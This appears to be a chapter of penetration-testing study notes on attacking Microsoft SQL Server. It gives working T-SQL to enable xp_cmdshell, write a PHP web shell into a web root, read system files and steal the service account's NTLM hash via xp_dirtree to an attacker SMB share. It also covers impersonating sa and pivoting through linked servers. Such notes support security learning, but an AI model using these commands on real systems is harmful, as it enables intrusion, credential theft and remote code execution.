\chapter{MSSQL}

\url{https://www.hackingarticles.in/mssql-for-pentester-metasploit/}

\section{introduction}
\href{https://www.microsoft.com/en-us/sql-server/sql-server-2019}{Microsoft
SQL (MSSQL)} is Microsoft's SQL-based relational database management system is
closed source and was initially written to run on Windows operating systems. It
is popular among database administrators and developers when building
applications that run on Microsoft's .NET framework due to its strong native
support for .NET. There are versions of MSSQL that will run on Linux and MacOS,
but we will more likely come across MSSQL instances on targets running
Windows.

\subsection{Default system databases}
MSSQL has default
\href{https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15}{system
databases} that can help to understand the structure of all the databases that
may be hosted on a target server. Here are the default databases and a brief
description of each:
\begin{itemize}
        \item {\bf master} Tracks all system information for an SQL server instance
        \item {\bf model} Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database
        \item {\bf msdb } The SQL Server Agent uses this database to schedule
            jobs and alerts
        \item {\bf tempdb} Stores temporary objects
        \item {\bf resource} Read-only database containing system objects
            included with SQL server
\end{itemize}

\subsection{Authentication mechanisms}
MSSQL supports two
\href{https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server}{authentication
modes}, which means that users can be created in Windows or the SQL Server:
\begin{itemize}
    \item {\bf Windows authentication mode} 	This is the default, often
        referred to as integrated security because the SQL Server security
        model is tightly integrated with Windows/Active Directory. Specific
        Windows user and group accounts are trusted to log in to SQL Server.
        Windows users who have already been authenticated do not have to
        present additional credentials.
    \item {\bf Mixed mode} 	Mixed mode supports authentication by
        Windows/Active Directory accounts and SQL Server. Username and password
        pairs are maintained within SQL Server.
\end{itemize}

\section{Dangerous Settings}
This is not an extensive list because there are countless ways MSSQL databases
can be configured by admins based on the needs of their respective
organizations. We may benefit from looking into the following:
\begin{itemize}
    \item MSSQL clients not using encryption to connect to the MSSQL server
    \item The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
    \item The use of
        \href{https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15}{named
        pipes}
    \item Weak and default {\bf sa} credentials. Admins may forget to disable this account
\end{itemize}


\section{Interaction}
\href{https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15}{SQL
Server Management Studio (SSMS)} comes as a feature that can be installed with
the MSSQL install package or can be downloaded and installed separately.

Many other clients can be used to access a database running on MSSQL. Including
but not limited to:
\begin{itemize}
    \item mssql-cli
    \item SQL Server PowerShell
    \item HediSQL
    \item SQLPro
    \item Impacket's mssqlclient.py~\ref{tool:impacket:mssqlclient}
\end{itemize}

\begin{verbatim}
mssqlclient.py Administrator@IP -windows-auth
select name from sys.databases

\end{verbatim}


\section{Footprint / enumeration}

\subsection{nmap}
\begin{verbatim}
jubeaz@htb[/htb]$ sudo nmap --script \
    ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
    ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,\
    ms-sql-dump-hashes \
    --script-args \
        mssql.instance-port=1433,mssql.username=sa,\
        mssql.password=,mssql.instance-name=MSSQLSERVER
    -sV -p 1433
\end{verbatim}

\subsection{metasploit}
\begin{verbatim}
use scanner/mssql/mssql_ping
\end{verbatim}

\section{Interaction}

\subsection{sqsh}
Sqsh is much more than a friendly prompt. It is intended to provide much of the
functionality provided by a command shell, such as variables, aliasing,
redirection, pipes, back-grounding, job control, history, command substitution,
and dynamic configuration. 

\begin{verbatim}
sqsh -S IP -U LOGIN -P PASSWORD
\end{verbatim}


\subsection{sqlcmd}

Windows sqlcmd allow to enter ransact-SQL statements, system procedures, and script files through a variety of available modes:
\begin{itemize}
    \item  At the command prompt.
    \item  In Query Editor in SQLCMD mode.
    \item  In a Windows script file.
    \item  In an operating system (Cmd.exe) job step of a SQL Server Agent job.
\end{itemize}

\subsection{dbeaver}

\section{Command execution}


There are several methods to get command execution:
\begin{itemize}
    \item  \verb+xp_cmdshell+ 
    \item  adding
        \href{https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server}{extended
        stored procedures}, 
    \item
        \href{https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration}{CLR
        Assemblies}
    \item
        \href{https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15}{SQL Server Agent Jobs}
    \item
        \href{https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql}{external
        scripts}
\end{itemize}

With the appropriate privileges, SQL database can be used to execute system
commands or create the necessary elements to do it.

\subsection{xp\_cmdshell}
MSSQL has a
\href{https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15}{extended
stored procedures} called
\href{https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15}{xp\_cmdshell}
which allow us to execute system commands using SQL. \verb+xp_cmdshell+:
\begin{itemize}
        \item is a powerful feature and disabled by default. It can be enabled
            and disabled by using the
            \href{https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration}{Policy-Based
            Management} or by executing
            \href{https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option}{sp\_configure}
        \item spawn a  Windows process that  has the same security rights as the
            SQL Server service account
        \item  operates synchronously. Control is not returned to the caller until the command-shell command is completed
\end{itemize}

To Enable \verb+xp_cmdshell+ with \verb+sp_configure+
\begin{verbatim}
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.
RECONFIGURE
GO

-- To enable the feature.
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for this feature.
RECONFIGURE
GO
\end{verbatim}

to launch a command:
\begin{verbatim}
xp_cmdshell 'whoami'
GO
\end{verbatim}

\section{Read / Write local files}

\subsection{Write file}
To write files using MSSQL, we need to enable
\href{https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option}{Ole
Automation Procedures}, which requires admin privileges, and then execute some stored procedures to create the file

\begin{verbatim}
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO

\end{verbatim}

\subsection{Read file}
By default, MSSQL allows file read on any file in the operating system to which the account has read access.

\begin{verbatim}
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
\end{verbatim}

\section{Capture MSSQL Service Hash}
MSSQL service account hash can be stolen using \verb+xp_subdirs+ or
\verb+xp_dirtree+ undocumented stored procedures, which use the SMB protocol to
retrieve a list of child directories under a specified parent directory from
the file system. NTLMv2 hash can be grabbed either by
responder~\ref{tool:responder} or impacket
smbserver~\ref{tool:impacket:smbserver}.


\begin{verbatim}
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
\end{verbatim}

\subsection{User impersonation}
MSSQL Server has a special permission, named \verb+IMPERSONATE+, that allows
the executing user to take on the permissions of another user or login until
the context is reset or the session ends.

First, identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned.
\begin{verbatim}
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
\end{verbatim}

Verify if current user has the sysadmin role:

\begin{verbatim}
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
\end{verbatim}

Impersonating the SA User

\begin{verbatim}
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
\end{verbatim}

It's recommended to run \verb+EXECUTE AS LOGIN+ within the master DB 
(\verb+USE master+), because
all users, by default, have access to that database. If a user you are trying
to impersonate doesn't have access to the DB you are connecting to it will
present an error. 

To revert the operation and return to our previous user, we can use the
Transact-SQL statement \verb+REVERT+.

\section{Communicate with Other Databases}
MSSQL has a configuration option called
\href{https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine}{linked
servers}. Linked servers are typically configured to enable the database engine
to execute a Transact-SQL statement that includes tables in another instance of
SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we
may be able to move laterally to that database server. Administrators can
configure a linked server using credentials from the remote server. If those
credentials have sysadmin privileges, we may be able to execute commands in the
remote SQL instance. Let's see how we can identify and execute queries on
linked servers.

\begin{verbatim}
SELECT srvname, isremote FROM sysservers
GO

\end{verbatim}

see sysservers
\href{https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql}{Transact-SQL} for more information.

Next, we can attempt to identify the user used for the connection and its
privileges. The
\href{https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql}{EXECUTE}
statement can be used to send pass-through commands to linked servers. We add
our command between parenthesis and specify the linked server between square
brackets ([ ]).

\begin{verbatim}
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') 
    AT [10.0.0.12\SQLEXPRESS]
GO
\end{verbatim}
If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

As we have seen, we can now execute queries with sysadmin privileges on the
linked server. As sysadmin, we control the SQL Server instance. We can read
data from any database or execute system commands with \verb+xp_cmdshell+.

